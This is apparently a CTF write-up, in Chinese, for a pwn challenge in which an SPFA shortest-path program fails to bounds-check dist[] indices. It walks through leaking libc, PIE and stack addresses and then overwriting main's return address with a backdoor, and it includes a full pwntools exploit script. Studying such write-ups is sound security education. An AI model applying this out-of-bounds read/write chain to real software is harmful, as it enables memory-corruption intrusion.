# ser_per_fa

## 题目简述

程序使用 SPFA 计算单源最短路，但读取和写入 `dist[index]` 时没有校验节点下标。负数或超大下标可以让数组越界：查询最短路结果形成任意地址读；构造一条指向越界“节点”的边，则能让松弛操作把边权写入目标地址。利用链先泄露 libc、PIE 与栈地址，最后把 `main` 的返回地址改成程序内置后门。

## 解题过程

计算完成后，程序直接使用用户给出的 `x` 访问距离数组：

```c
printf("calc done!\nwhich path you are interested %lld to ?\n>> ", x);
scanf("%lld", &x);
printf("the length of the shortest path is %lld\n", dist[x]);
```

若 `dist` 每项为 8 字节，则任意目标地址 `target` 对应的下标为：

```text
index = (target - runtime_address_of_dist) / 8
```

在 PIE 尚未泄露时，相对位置仍然固定，因此可以先用 `(puts@got - dist) / 8` 读取 GOT 中的 `puts` 指针，得到 libc 基址。随后在 GDB 中搜索进程映射里残留的高位地址，原题构建可在 `dist[-2367]` 读到偏移为 `0x12e0` 的程序指针，由此恢复 PIE 基址。

有了两个基址后，读取 libc 的 `_environ`。该全局变量保存栈上环境变量指针，原题调试确认 `_environ` 指向的位置与 `main` 保存返回地址相差 `0x100` 字节。最后构造一条从节点 0 指向越界下标的边：初始 `dist[0]` 为 0，松弛后会把边权写到 `dist[target_index]`，所以将边权设为后门绝对地址即可覆盖返回地址。

下面的脚本把四组数据依次用于 libc 泄露、PIE 泄露、栈泄露和返回地址覆盖。所有除法都使用 `//`，以保证 Python 3 中得到整数下标：

```python
from pwn import *

context.arch = "amd64"
elf = ELF("./spfa", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)
io = remote("challenge.example", 10000)

dist_offset = elf.sym["dist"]
puts_got_offset = elf.got["puts"]

io.sendlineafter(b"datas?\n>> ", b"4")

def read_dist(index):
    io.sendlineafter(b"nodes?\n>> ", b"1")
    io.sendlineafter(b"edges?\n>> ", b"0")
    io.sendlineafter(b"node?\n>> ", b"0")
    io.sendlineafter(b"to ?\n>> ", str(index).encode())
    io.recvuntil(b"path is ")
    return int(io.recvline().strip())

# 1. GOT 与 dist 的相对偏移不受 PIE 影响。
puts_index = (puts_got_offset - dist_offset) // 8
puts_addr = read_dist(puts_index)
libc_base = puts_addr - libc.sym["puts"]

# 2. 该越界位置和 0x12e0 偏移由原题二进制的 GDB 搜索确定。
pie_pointer = read_dist(-2367)
pie_base = pie_pointer - 0x12e0
dist_addr = pie_base + dist_offset

# 3. 读取 _environ 保存的栈地址。
environ_slot = libc_base + libc.sym["_environ"]
environ_index = (environ_slot - dist_addr) // 8
environ_value = read_dist(environ_index)

# 4. 原题中 main 返回地址位于 environ_value - 0x100。
return_address = environ_value - 0x100
return_index = (return_address - dist_addr) // 8
backdoor = pie_base + 0x16aa

io.sendlineafter(b"nodes?\n>> ", b"2")
io.sendlineafter(b"edges?\n>> ", b"1")
io.sendlineafter(
    b"format\n",
    f"0 {return_index} {backdoor}".encode(),
)
io.sendlineafter(b"node?\n>> ", b"0")
io.sendlineafter(b"to ?\n>> ", b"0")
io.interactive()
```

`-2367`、`0x12e0`、`0x100` 和 `0x16aa` 都是针对原题附件测得的索引或偏移，并非通用常量。更换二进制或 libc 后，应重新用 GDB 搜索残留指针、确认栈帧位置和后门偏移。

## 方法总结

算法题外壳并不改变漏洞本质：未校验的数组下标先提供越界读，而 SPFA 的松弛赋值又把它扩展为受控写。完整利用需要按顺序建立地址信息：GOT 泄露 libc、残留指针泄露 PIE、`_environ` 泄露栈，最后用图边权覆盖返回地址。最容易出错的是把数组索引、字节偏移和运行时绝对地址混在一起，因此每一步都应明确以 `dist` 的实际地址为基准并除以元素大小 8。
